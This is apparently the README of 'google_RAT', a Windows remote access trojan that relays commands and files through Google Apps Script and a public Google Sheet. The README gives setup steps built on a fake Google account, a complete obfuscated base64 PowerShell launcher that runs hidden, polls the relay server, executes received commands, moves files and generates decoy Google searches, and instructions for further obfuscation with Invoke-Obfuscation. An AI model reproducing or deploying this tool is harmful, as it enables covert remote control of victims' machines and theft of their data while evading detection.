# google_RAT
A RAT (Remote Access Tool) for Windows systems using google apps script as the middle man

**NOTE:** Current limit to data upload and download is 8.5 MB. This is due to the [limits of google sheets](https://gsuitetips.com/tips/sheets/google-spreadsheet-limitations/).

## TODO
* add timestamps to google drive output
* implement data reset from `script.py` for a stale client

## Setup

### Deploying Google Server and Spreadsheet Database
* Create a fake Google account
* Create a spreadsheet in the fake account's Google drive
* Make it public:
  * `File` > `Share...` > Give it a random name > `Get sharable link`
* Paste the link into the `SPREADSHEET_URL` variable in `server.js`
  * remove the `?usp=sharing` at the end of the URL. It should end in `/edit`
* Visit [Google Scripts](https://www.google.com/script/start/) and paste the code in `server.js`
* Publish the server:
  * Save and name the project something
  * `Publish` > `Deploy as web app`
    * Fill in the blank with something
    * Make sure the app is executed as `Me`
    * Make sure `Anyone, even anonymous` can access the app
  * `Review Permissions` > Select your fake account > `Advanced` > `Go to Untitled project (unsafe)` > enter 'Continue' > `Allow`
  * Copy the URL and paste it into `$SRV` of `script.ps1`

### Deploying Powershell Client
**tldr** Test powershell obfuscated and base64 encoded command:
```
powershell.exe -noE -NonI -nOpR -eNc JABDAEgAVQBOAEsAXwBTAEkAWgBFAD0AMwA1ADAAMAAwADsAJABTAEkAWgBFAF8ATABJAE0ASQBUAD0AOAA1ADAAMAAwADAAMAA7ACQAUwBSAFYAPQAoACIAewA3AH0AewAxAH0AewA4AH0AewA1AH0AewA0AH0AewAxADgAfQB7ADEANAB9AHsAMAB9AHsAMQAyAH0AewAzAH0AewA5AH0AewAyADAAfQB7ADEANQB9AHsAMQA5AH0AewAyAH0AewAxADEAfQB7ADYAfQB7ADEANwB9AHsAMQA2AH0AewAxADMAfQB7ADEAMAB9ACIAIAAtAGYAIAAnAG8AcwAvAHMAJwAsACcAaQBwAHQAJwAsACcAWAA3AGEAUwBLAE8AaAAnACwAJwBLAGYAJwAsACcAbABlAC4AYwBvAG0ALwAnACwAJwBvAGcAJwAsACcARQAtAGsAJwAsACcAaAB0AHQAcABzADoALwAvAHMAYwByACcALAAnAC4AZwBvACcALAAnAHkAYwBiAHkANgBSAGcAZQAnACwAJwBmAE0ALwBlAHgAZQBjACcALAAnAG4AZQB5AGIAeQBlAHoAWQBhAFgAYQBEAEcAeQAnACwAJwAvAEEAJwAsACcAZQBFAGgAJwAsACcAYwByACcALAAnAGQARAByACcALAAnAG0AaQAnACwAJwBLAFoAcABhAGwAZQAnACwAJwBtAGEAJwAsACcAQwA2ACcALAAnAGEAWgAnACkAOwAkAFMARQBBAFIAQwBIAF8ARABJAEMAVABJAE8ATgBBAFIAWQA9AEAAKAAoACIAewAyAH0AewAxAH0AewAwAH0AIgAgAC0AZgAgACcAbgAnACwAJwBpACcALAAnAGIAaQB0AGMAbwAnACkALAAoACIAewAwAH0AewAxAH0AIgAtAGYAIAAnAHYAYQBjAGEAdABpAG8AJwAsACcAbgAnACkALAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAnAGQAYQBuAGMAaQAnACwAJwBuAGcAJwApACwAKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBmAGEAYwBlACcALAAnAGIAbwBvAGsAJwApACwAKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACAAJwB0ACcALAAnAHIAZQBkACcALAAnAGQAaQAnACkALAAnAGMAYQB0ACcALAAnAGQAbwBnACcALAAnAGcAaQBmACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAHAAaABvAG4AZQAnACwAJwBpACcAKQAsACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAnAHQAcgAnACwAJwB1AG0AcAAnACkALAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAIAAnAG8AdQB0AHUAJwAsACcAeQAnACwAJwBiAGUAJwApACwAKAAiAHsAMQB9AHsAMAB9ACIALQBmACcAYQB6AG8AbgAnACwAJwBhAG0AJwApACwAKAAiAHsAMAB9AHsAMgB9AHsAMQB9AHsAMwB9ACIAIAAtAGYAJwBzAGsAeQAnACwAJwB2AGkAbgAnACwAJwBkAGkAJwAsACcAZwAnACkALAAnAG4AZgBsACcALAAoACIAewAwAH0AewAxAH0AewAyAH0AIgAtAGYAIAAnAGYAbwAnACwAJwBvAHQAYgBhACcALAAnAGwAbAAnACkALAAoACIAewAyAH0AewAxAH0AewAwAH0AIgAtAGYAJwBhAGwAbAAnACwAJwB0AGIAJwAsACcAYgBhAHMAawBlACcAKQApADsAZgB1AG4AYwB0AGkAbwBuACAAZwBgAGUAVAB7AHAAYQByAGEAbQAoACQAaQBlACwAJABrACwAJABkACkAOwAkAHgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGQAKQApADsAJABpAGUALgBuAGEAdgBpAGcAYQB0AGUAMgAoACQAUwBSAFYAKwAiAD8AJABrAD0AIgArACQAeAAsADEANAAsADAALAAkAG4AdQBsAGwALAAkAG4AdQBsAGwAKQA7AHcAaABpAGwAZQAoACQAaQBlAC4AYgB1AHMAeQAgAC0AbwByACAAKAAkAGkAZQAuAHIAZQBhAGQAeQBzAHQAYQB0AGUAIAAtAG4AZQAgADQAKQApAHsAcwBMAEUAYABFAFAAIAAtAHMAZQBjAG8AbgBkAHMAIAAxAH0AOwByAGUAdAB1AHIAbgAgACQAaQBlAC4AZABvAGMAdQBtAGUAbgB0AC4AbABhAHMAdABjAGgAaQBsAGQALgBpAG4AbgBlAHIAdABlAHgAdAA7AH0AZgB1AG4AYwB0AGkAbwBuACAAcABvAGAAUwBUAHsAcABhAHIAYQBtACgAJABpAGUALAAkAGsALAAkAGQALAAkAHAAKQA7ACQAeAA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZAApACkAOwAkAGkAZQAuAG4AYQB2AGkAZwBhAHQAZQAyACgAJABTAFIAVgArACIAPwAkAGsAPQAiACsAJAB4ACwAMQA0ACwAMAAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAIgBkAD0AJABwACIAKQAsACQAbgB1AGwAbAApADsAdwBoAGkAbABlACgAJABpAGUALgBiAHUAcwB5ACAALQBvAHIAIAAoACQAaQBlAC4AcgBlAGEAZAB5AHMAdABhAHQAZQAgAC0AbgBlACAANAApACkAewBzAGwAYABlAEUAUAAgAC0AcwBlAGMAbwBuAGQAcwAgADEAfQA7AH0AZgB1AG4AYwB0AGkAbwBuACAAcgBgAFUAbgB7AHAAYQByAGEAbQAoACQAcwAsACQAaQBlACkAOwAkAHQAeQBwAGUAPQBnAGAARQB0ACAAJABpAGUAIAAnAFQAeABSACcAIAAkAHMAOwBpAGYAKAAkAHQAeQBwAGUAIAAtAG4AZQAgACcAMAAnACkAewAkAGMAbwBsAD0AMwA7ACQAYgB1AGYAPQBuAEUAVwAtAG8AYABCAGAAagBlAGMAdAAgACgAJwBDAG8AJwArACcAbABsAGUAYwB0ACcAKwAnAGkAbwBuAHMALgBBACcAKwAnAHIAcgBhAHkATAAnACsAJwBpAHMAJwArACcAdAAnACkAOwB3AGgAaQBsAGUAKAAxACkAewAkAGQAPQBnAGAARQBUACAAJABpAGUAIAAnAFQAeABEACcAIAAoACQAcwArACcAfAAnACsAJABjAG8AbAApADsAaQBmACgAJABkACAALQBlAHEAIAAkAG4AdQBsAGwAKQB7AGIAcgBlAGEAawA7AH0AJABiAHUAZgAuAGEAZABkACgAJABkACkAfABPAGAAVQBUAC0AbgBgAFUAbABMADsAJABjAG8AbAArACsAOwB9AHAAYABvAHMAVAAgACQAaQBlACAAJwBUAHgAJwAgACgAJABzACsAJwB8ADIAJwApACAAJwAwACcAOwBpAGYAKAAkAHQAeQBwAGUAIAAtAGUAcQAgACcAQAAnACkAewAkAHgAYwA9ACQAYgB1AGYAIAAtAGoAbwBpAG4AIAAnACcAOwAkAHIAPQBQAE8AYAB3AGUAcgBgAHMAYABoAGUAbABsAC4ARQBYAEUAIAAtAG4AbwBwAHIAIAAtAG4AbwBuAGkAIAAtAGUAbgBjACAAJAB4AGMAOwBpAGYAKAAkAHIAIAAtAGUAcQAgACQAbgB1AGwAbAApAHsAJAByAD0AKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBOACcALAAnAFUATABMACcAKQA7AH0AZQBsAHMAZQB7ACQAcgA9ACQAcgB8AG8AdQBgAFQALQBzAHQAYABSAGAAaQBOAGcAOwB9ACQAcgA9ACQAcgAuAFQAbwBDAGgAYQByAEEAcgByAGEAeQAoACkAOwB9AGUAbABzAGUAaQBmACgAJAB0AHkAcABlACAALQBlAHEAIAAnAF4AJwApAHsAJAByAD0AWwBJAE8ALgBmAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiAHUAZgAgAC0AagBvAGkAbgAgACcAJwApACkAKQA7AGkAZgAoACQAcgAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAkAFMASQBaAEUAXwBMAEkATQBJAFQAKQB7ACQAcgA9ACcAJwA7AH0AfQBlAGwAcwBlAHsAWwBJAE8ALgBmAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAiACQAdAB5AHAAZQAiACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmACAALQBqAG8AaQBuACAAJwAnACkAKQA7ACQAcgA9ACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcATgBVAEwAJwAsACcATAAnACkALgBUAG8AQwBoAGEAcgBBAHIAcgBhAHkAKAApADsAfQAkAGMAbwBsAD0AMwA7ACQAaQA9ADAAOwB3AGgAaQBsAGUAKAAkAGkAIAAtAGwAZQAgACgAJAByAC4AbABlAG4AZwB0AGgALQAkAEMASABVAE4ASwBfAFMASQBaAEUAKQApAHsAJAB4AD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcgBbACQAaQAuAC4AKAAkAGkAKwAkAEMASABVAE4ASwBfAFMASQBaAEUALQAxACkAXQApADsAcABvAGAAUwB0ACAAJABpAGUAIAAnAFIAeAAnACAAKAAkAHMAKwAnAHwAJwArACQAYwBvAGwAKQAgACQAeAA7ACQAaQAgACsAPQAgACQAQwBIAFUATgBLAF8AUwBJAFoARQA7ACQAYwBvAGwAKwArADsAfQAkAHgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAByAFsAJABpAC4ALgAoACQAcgAuAGwAZQBuAGcAdABoAC0AMQApAF0AKQA7AFAAbwBgAHMAdAAgACQAaQBlACAAJwBSAHgAJwAgACgAJABzACsAJwB8ACcAKwAkAGMAbwBsACkAIAAkAHgAOwBwAGAATwBzAHQAIAAkAGkAZQAgACcAUgB4ACcAIAAoACQAcwArACcAfAAyACcAKQAgACcAMQAnADsAfQB9AHcAaABpAGwAZQAoADEAKQB7AHQAcgB5AHsAJABpAGUAPQBOAEUAYABXAGAALQBvAGIAagBlAEMAVAAgAC0AYwBvAG0AIAAoACcAaQBuAHQAJwArACcAZQByAG4AZQB0AGUAeABwAGwAJwArACcAbwByAGUAcgAuAGEAcAAnACsAJwBwAGwAaQBjAGEAJwArACcAdAAnACsAJwBpAG8AbgAnACkAOwAkAGkAZQAuAHYAaQBzAGkAYgBsAGUAPQAkAGYAYQBsAHMAZQA7ACQAaQBlAC4AcwBpAGwAZQBuAHQAPQAkAHQAcgB1AGUAOwAkAGkAcAA9AEcAZQBUAC0AVwBgAE0AaQBPAEIAagBgAGUAQwB0ACAAKAAnAFcAaQBuADMAMgBfAE4AZQAnACsAJwB0AHcAbwAnACsAJwByAGsAQQBkACcAKwAnAGEAcAB0AGUAJwArACcAcgAnACsAJwBDAG8AbgAnACsAJwBmAGkAZwAnACsAJwB1AHIAYQB0ACcAKwAnAGkAbwBuACcAKQB8AHcAYABIAEUAcgBlAHsAJABfAC4ASQBwAGEAZABkAHIAZQBzAHMALgBsAGUAbgBnAHQAaAAgAC0AZwB0ACAAMQB9ADsAJABzAD0AJABpAHAALgBpAHAAYQBkAGQAcgBlAHMAcwBbADAAXQArACcAfAAnACsAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQA7AHcAaABpAGwAZQAoADEAKQB7AHIAYABVAE4AIAAkAHMAIAAkAGkAZQA7ACQAcgAxAD0ARwBgAGUAVABgAC0AcgBBAG4AYABkAG8AbQAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJABTAEUAQQBSAEMASABfAEQASQBDAFQASQBPAE4AQQBSAFkAOwAkAHIAMgA9AGcAZQB0AC0AcgBBAGAATgBEAGAATwBNACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAFMARQBBAFIAQwBIAF8ARABJAEMAVABJAE8ATgBBAFIAWQA7ACQAaQBlAC4AbgBhAHYAaQBnAGEAdABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AcwBlAGEAcgBjAGgAPwBxAD0AJAByADEAKwAkAHIAMgAiACwAMQA0ACkAOwAkAGQAZQBsAGEAeQA9AGcAZQB0AC0AcgBgAEEAbgBkAGAAbwBNACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAA1ACwANgAsADcALAA4ACwAOQAsADEAMAA7AFMATABgAGUARQBQACAALQBzAGUAYwBvAG4AZABzACAAJABkAGUAbABhAHkAOwAkAGkAZQAuAHMAdABvAHAAKAApADsAfQB9AGMAYQB0AGMAaAB7AHQAYABBAGAAUwBLAEsASQBsAGwALgBgAEUAWABlACAAKAAnAC8AZgAnACkAIAAoACcALwBpACcAKwAnAG0AJwApACAAKAAnAGkAZQB4AHAAbABvAHIAZQAnACsAJwAuAGUAeAAnACsAJwBlACcAKQA7AH0AfQA=
```
* Run the following powershell to compress `script.ps1`:
```
$s = gc <path to script.ps1>
$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
$sx = [system.text.encoding]::unicode.getstring([convert]::frombase64string($x))
$sx = $sx.replace('  ', '')
$sx = $sx.replace(' = ', '=')
$sx = $sx.replace(' + ', '+')
$sx = $sx.replace(' - ', '-')
$sx = $sx.replace(' | ', '|')
$sx = $sx.replace('if (', 'if(')
$sx = $sx.replace('while (', 'while(')
$sx = $sx.replace(', ', ',')
$sx = $sx.replace('; ', ';')
$sx = $sx.replace('} ', '}')
$sx = $sx.replace('{ ', '{')
$sx = $sx.replace(' {', '{')
write-host $sx
```
* Download [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and run the following obfuscation techniques:
  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'Command' 1`
  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'String' 2`
  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'CommandArgument' 3`
* Take the resulting obfuscated powershell and run the following powershell to produce the base64 encoded string:
```
$s = gc <path to file with obfuscated powershell command>
$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
write-host $x
```
* Copy the above output into the following command: `powershell.exe -noE -NonI -nOpR -eNc <output>`

### Deploying Python Shell
**NOTE:** Script requires python 3
* Copy the public link to Google apps server (same one pasted into `script.ps1`) and run the following command
  * `python script.py <url to google apps server>`
* Fun test commands:
  * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
  * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`
